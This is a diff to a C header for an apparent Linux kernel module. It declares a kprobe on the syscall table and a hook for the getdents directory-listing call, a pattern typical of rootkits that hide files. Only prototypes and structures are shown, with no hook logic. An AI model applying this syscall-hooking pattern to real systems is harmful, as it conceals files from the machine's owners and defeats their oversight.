@@ -6,22 +6,20 @@
 #include <linux/kprobes.h>
 
 /* For each probe you need to allocate a kprobe structure */
-extern static struct kprobe kp = {
-	.symbol_name	= "sys_call_table",
-};
+extern struct kprobe kp;
 
 /* Custom linux_dirent structure */
-extern struct linux_dirent {
+struct linux_dirent {
     unsigned long d_ino;       // Inode number
     unsigned long d_off;       // Offset to next dirent
     unsigned short d_reclen;   // Length of this record
     char d_name[];             // Filename (null-terminated)
 };
 
+/* Function prototypes */
+int pre_handler(struct kprobe *p, struct pt_regs *regs);
+int hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
-/* https://www.man7.org/linux/man-pages/man2/getdents.2.html */
-unsigned long *custom_kallsyms_lookup(void);
-asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 typedef asmlinkage int (*getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
 extern getdents_t original_getdents;
 
